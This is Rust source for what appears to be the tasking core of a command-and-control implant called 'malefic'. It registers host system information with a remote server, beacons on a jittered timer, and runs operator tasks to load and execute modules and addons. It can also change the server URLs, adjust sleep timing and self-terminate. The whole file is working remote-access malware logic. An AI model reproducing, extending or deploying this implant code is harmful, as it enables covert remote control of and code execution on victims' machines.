use anyhow::anyhow;
use futures::SinkExt;
use futures::StreamExt;
use futures_timer::Delay;
use lazy_static::lazy_static;
use std::str::FromStr;
use std::time::Duration;

use crate::malefic::MaleficChannel;
use crate::meta::MetaConfig;
use malefic_core::common::error::MaleficError;
use malefic_core::manager::internal::InternalModule;
use malefic_core::manager::manager::MaleficManager;
use malefic_core::scheduler::TaskOperator;
use malefic_core::transport::{Client, InnterTransport};
use malefic_core::{check_body, config};
use malefic_helper::debug;
use malefic_proto::proto::{modulepb, implantpb, implantpb::{Spite, Spites}, implantpb::spite::Body};
use malefic_proto::{marshal, new_error_spite, new_spite};



lazy_static! {
    pub static ref EMPTY_SPITES: Spites = Spites {
        spites: vec![Spite::default()]
    };
}

pub struct MaleficStub {
    pub(crate) manager: MaleficManager,
    pub(crate) meta: MetaConfig,
    pub(crate) channel: MaleficChannel,
}

impl MaleficStub {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Self {
        let mut manager = MaleficManager::new();
        if let Ok(_) = manager.refresh_module() {
            MaleficStub {
                manager,
                meta: MetaConfig::new(instance_id),
                channel,
            }
        } else {
            panic!("origin modules refresh failed");
        }
    }

    pub fn register_spite(&mut self) -> Spite {
        let sysinfo = malefic_core::common::sys::get_register_info();
        debug!("sysinfo: {:#?}", sysinfo);

        new_spite(
            0,
            "register".to_string(),
            Body::Register(modulepb::Register {
                name: config::NAME.to_string(),
                proxy: config::PROXY.to_string(),
                module: self.manager.list_module(InternalModule::all()),
                addons: self.manager.list_addon(),
                sysinfo,
                timer: Some(modulepb::Timer {
                    interval: config::INTERVAL.clone(),
                    jitter: config::JITTER.clone() as f64,
                }),
            }),
        )
    }

    async fn push(&mut self, spite: Spite) -> anyhow::Result<()> {
        self.channel.data_sender.send(spite).await?;
        Ok(())
    }

    pub async fn process_data(
        &mut self,
        transport: InnterTransport,
        client: &mut Client,
    ) -> Result<(), anyhow::Error> {
        self.channel.request_sender.send(true).await?;

        let spites = if let Some(data) = self.channel.response_receiver.next().await {
            data
        } else {
            EMPTY_SPITES.clone()
        };

        #[cfg(debug_assertions)]
        {
            if malefic_proto::get_message_len(&spites) <= 2048 {
                println!("{:#?}", spites);
            } else {
                println!("length: {}", spites.spites.len());
            }
        }
        let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
        if let Ok(res) = client.handler(transport, marshaled).await {
            match res {
                Some(spite_data) => {
                    let spites = spite_data.parse()?;
                    self.handler(spites).await?;
                }
                None => {
                    debug!("[beacon] no recv");
                }
            }
        } else {
            debug!("[beacon] send error, recover spites");
            for spite in spites.spites {
                self.push(spite).await?;
            }
        }

        Ok(())
    }

    pub async fn handler(&mut self, spites: Spites) -> anyhow::Result<()> {
        for spite in spites.spites {
            #[cfg(debug_assertions)]
            {
                if malefic_proto::get_message_len(&spite) <= 2048 {
                    println!("{:#?}", spite);
                } else {
                    println!("taskid: {} {}", spite.task_id, spite.name);
                }
            }
            match self.handler_spite(spite.clone()).await {
                Ok(_) => {
                    debug!("{}:{} sender succ", spite.task_id, spite.name)
                }
                Err(e) => {
                    debug!("handler encountered an error: {:#?}", e);
                    let error_id = if let Some(malefic_error) = e.downcast_ref::<MaleficError>() {
                        malefic_error.id()
                    } else {
                        999
                    };
                    self.push(new_error_spite(spite.task_id, spite.name, error_id))
                        .await?
                }
            }
        }
        Ok(())
    }

    pub async fn handler_spite(&mut self, req: Spite) -> anyhow::Result<()> {
        match InternalModule::from_str(req.name.as_str()) {
            Ok(InternalModule::Ping) => {
                let ping = check_body!(req, Body::Ping)?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Ping.to_string(),
                    Body::Ping(modulepb::Ping { nonce: ping.nonce }),
                ))
                .await?
            }
            Ok(InternalModule::Init) => {
                let req = check_body!(req, Body::Init)?;
                let id: [u8; 4] = req
                    .data
                    .try_into()
                    .map_err(|_| anyhow!("Expected a Vec<u8> of length 4"))?;

                self.meta.set_id(id);
                let spite = self.register_spite();
                self.push(spite).await?
            }
            Ok(InternalModule::RefreshModule) => {
                self.manager.refresh_module()?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::RefreshModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules: self.manager.list_module(InternalModule::all()),
                    }),
                ))
                .await?;
            }
            Ok(InternalModule::ListModule) => {
                let result = new_spite(
                    req.task_id,
                    InternalModule::ListModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules: self.manager.list_module(InternalModule::all()),
                    }),
                );
                self.push(result).await?;
            }
            #[cfg(target_os = "windows")]
            Ok(InternalModule::LoadModule) => {
                let modules = self.manager.load_module(req.clone())?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::LoadModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules,
                    }),
                ))
                .await?;
            }
            #[cfg(not(target_os = "windows"))]
            Ok(InternalModule::LoadModule) => {
                return Err(anyhow::anyhow!("LoadModule is only supported on Windows"));
            }
            Ok(InternalModule::LoadAddon) => {
                self.manager.load_addon(req.clone())?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::LoadAddon.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::ListAddon) => {
                let result = new_spite(
                    req.task_id,
                    InternalModule::ListAddon.to_string(),
                    Body::Addons(modulepb::Addons {
                        addons: self.manager.list_addon(),
                    }),
                );
                self.push(result).await?;
            }
            Ok(InternalModule::ExecuteAddon) => {
                let result = self.manager.execute_addon(req)?;
                let module = self
                    .manager
                    .get_module(&result.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                let body = result.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                self.channel
                    .scheduler_task_sender
                    .send((result.r#async, result.task_id, module.new_instance(), body))
                    .await?;
            }
            Ok(InternalModule::RefreshAddon) => {
                self.manager.refresh_addon()?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::RefreshAddon.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::Clear) => {
                self.manager.clean()?;
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Clear.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::CancelTask) => {
                if let Some(Body::Task(task)) = req.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send((req.task_id, TaskOperator::CancelTask(task.task_id)))
                        .await?;
                }
            }
            Ok(InternalModule::QueryTask) => {
                if let Some(Body::Task(task)) = req.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send((req.task_id, TaskOperator::QueryTask(task.task_id)))
                        .await?;
                }
            }
            Ok(InternalModule::ListTask) => {
                self.channel
                    .scheduler_task_ctrl
                    .send((req.task_id, TaskOperator::ListTask))
                    .await?;
            }
            Ok(InternalModule::Sleep) => {
                let sleep = check_body!(req, Body::SleepRequest)?;
                self.meta.update(sleep.interval, sleep.jitter);
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Sleep.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
            }
            Ok(InternalModule::Suicide) => {
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Suicide.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?;
                Delay::new(Duration::from_secs(self.meta.interval * 2)).await;
                std::process::exit(0);
            }
            Ok(InternalModule::Switch) => {
                let login = check_body!(req, Body::Switch)?;
                self.meta.update_urls(login.urls);
                self.push(new_spite(
                    req.task_id,
                    InternalModule::Switch.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                ))
                .await?
            }
            Err(_) => {
                let body = req.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                let module = self
                    .manager
                    .get_module(&req.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                self.channel
                    .scheduler_task_sender
                    .send((req.r#async, req.task_id, module.new_instance(), body))
                    .await?;
            }
        };
        Ok(())
    }
}
